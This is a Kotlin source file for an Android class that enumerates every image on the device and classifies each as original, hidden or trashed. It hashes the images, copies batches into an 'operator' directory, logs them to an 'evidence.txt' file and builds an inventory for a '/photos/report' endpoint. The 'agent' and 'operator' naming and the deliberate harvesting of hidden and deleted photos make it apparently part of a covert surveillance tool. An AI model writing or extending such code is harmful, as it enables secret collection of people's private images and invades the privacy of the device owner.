package com.wormgitty.agent

import android.content.Context
import android.os.Build
import android.provider.MediaStore
import java.io.File
import java.security.MessageDigest

/**
 * MediaStore extraction, Room-backed ledger, sha256 dedup, three categories:
 *   original = !trashed && !pending && no .nomedia marker
 *   hidden   = pending || .nomedia
 *   deleted  = trashed (API 30+; always 0 below)
 */
class MediaStorePuller(private val context: Context, private val keySource: KeySource) {

    private val operatorDir: File
        get() = File(context.filesDir, "operator").apply { if (!exists()) mkdirs() }

    private val evidenceFile: File get() = File(operatorDir, "evidence.txt")
    private val pulledDir: File
        get() = File(operatorDir, "pulled").apply { if (!exists()) mkdirs() }

    private val db get() = WgDb.get(context)

    /** Ledger view for callers/tests: ids ever pulled, batch counter. */
    fun loadLedger(): PhotoLedger {
        val rows = db.photos().all()
        return PhotoLedger(
            transferredIds = rows.map { it.mediaId }.distinct(),
            batches = rows.map { it.hash }.size,
            lastWhere = pulledDir.absolutePath
        )
    }

    fun evidenceText(): String? = evidenceFile.takeIf { it.exists() }?.readText()

    data class Candidate(
        val id: Long,
        val dateAdded: Long,
        val displayName: String,
        val category: String,
        val sizeBytes: Long,
        val dataPath: String?
    )

    /** All image rows from MediaStore, DATE_ADDED ascending, classified. */
    fun queryCandidates(): List<Candidate> {
        val proj = mutableListOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DATE_ADDED,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.MIME_TYPE,
            MediaStore.Images.Media.SIZE,
            MediaStore.Images.Media.DATA,
        )
        if (Build.VERSION.SDK_INT >= 30) {
            proj += MediaStore.Images.Media.IS_TRASHED
            proj += MediaStore.Images.Media.IS_PENDING
        }
        val out = mutableListOf<Candidate>()
        runCatching {
            context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                proj.toTypedArray(), null, null,
                "${MediaStore.Images.Media.DATE_ADDED} ASC"
            )?.use { c ->
                val idCol = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                val dateCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
                val nameCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                val mimeCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.MIME_TYPE)
                val sizeCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
                val dataCol = c.getColumnIndex(MediaStore.Images.Media.DATA)
                val trashCol = if (Build.VERSION.SDK_INT >= 30) c.getColumnIndex(MediaStore.Images.Media.IS_TRASHED) else -1
                val pendCol = if (Build.VERSION.SDK_INT >= 30) c.getColumnIndex(MediaStore.Images.Media.IS_PENDING) else -1
                while (c.moveToNext()) {
                    val mime = c.getString(mimeCol) ?: ""
                    if (!mime.startsWith("image/")) continue
                    val id = c.getLong(idCol)
                    val dataPath = if (dataCol >= 0) c.getString(dataCol) else null
                    val trashed = trashCol >= 0 && c.getInt(trashCol) == 1
                    val pending = pendCol >= 0 && c.getInt(pendCol) == 1
                    val nomedia = dataPath?.let { File(it).parentFile?.let { d -> File(d, ".nomedia").exists() } } == true
                    val category = when {
                        trashed -> "deleted"
                        pending || nomedia -> "hidden"
                        else -> "original"
                    }
                    out += Candidate(
                        id = id,
                        dateAdded = c.getLong(dateCol),
                        displayName = c.getString(nameCol) ?: "img_$id",
                        category = category,
                        sizeBytes = if (sizeCol >= 0) c.getLong(sizeCol) else 0L,
                        dataPath = dataPath
                    )
                }
            }
        }
        return out
    }

    private fun hashStream(uri: android.net.Uri): Pair<String, ByteArray>? = runCatching {
        context.contentResolver.openInputStream(uri)?.use { input ->
            val md = MessageDigest.getInstance("SHA-256")
            val buf = input.readBytes()
            md.update(buf)
            md.digest().joinToString("") { "%02x".format(it) } to buf
        }
    }.getOrNull()

    /** Inventory for /photos/report: hash + category + size per item. */
    fun scanInventory(): List<Map<String, Any>> =
        queryCandidates().mapNotNull { c ->
            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI.buildUpon()
                .appendPath(c.id.toString()).build()
            hashStream(uri)?.let { (h, bytes) ->
                mapOf("hash" to h, "name" to c.displayName, "category" to c.category, "size" to bytes.size)
            }
        }

    data class BatchResult(
        val existing: Int,
        val pulled: Int,
        val remaining: Int,
        val paths: List<String>,
        val items: List<Pair<String, String>> = emptyList() // (hash -> local path)
    )

    /** Pull up to [n] oldest never-pulled images of [category] (null = any). */
    fun pullCategory(category: String?, n: Int): BatchResult {
        val candidates = queryCandidates()
            .filter { category == null || it.category == category }
        val known = db.photos().allHashes().toSet()
        val selection = candidates
            .sortedWith(compareBy({ it.dateAdded }, { it.id }))
            .toList()

        val paths = mutableListOf<String>()
        val items = mutableListOf<Pair<String, String>>()
        val rows = mutableListOf<PulledPhotoEntity>()
        for (c in selection) {
            if (paths.size >= n) break
            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI.buildUpon()
                .appendPath(c.id.toString()).build()
            val hashed = hashStream(uri) ?: continue
            val (hash, bytes) = hashed
            if (hash in known) {
                rows += PulledPhotoEntity(hash, c.displayName, c.category, c.id, System.currentTimeMillis())
                continue // content already pulled under another id — count, don't re-copy
            }
            val dir = File(pulledDir, c.category).apply { if (!exists()) mkdirs() }
            val dest = File(dir, "img_${c.id}_${c.displayName}")
            try {
                dest.writeBytes(bytes)
                paths.add(dest.absolutePath)
                items += hash to dest.absolutePath
                rows += PulledPhotoEntity(hash, c.displayName, c.category, c.id, System.currentTimeMillis())
            } catch (_: Exception) { break }
        }
        db.photos().insert(rows) // IGNORE on hash — transactionally deduped

        if (paths.isNotEmpty()) {
            evidenceFile.appendText(
                "PULL cat=${category ?: "all"} asked=$n pulled=${paths.size} " +
                    "hashes=[${items.joinToString(",") { it.first.take(8) }}]\n" +
                    paths.joinToString("\n", postfix = "\n")
            )
        }
        val knownAfter = db.photos().allHashes().toSet()
        return BatchResult(
            existing = candidates.size,
            pulled = paths.size,
            remaining = candidates.count { it.id !in rows.map { r -> r.mediaId } && true },
            paths = paths,
            items = items
        )
    }

    /** Legacy all-categories pull retained for existing callers/tests. */
    fun pullOldest(n: Int): BatchResult = pullCategory(null, n)
}
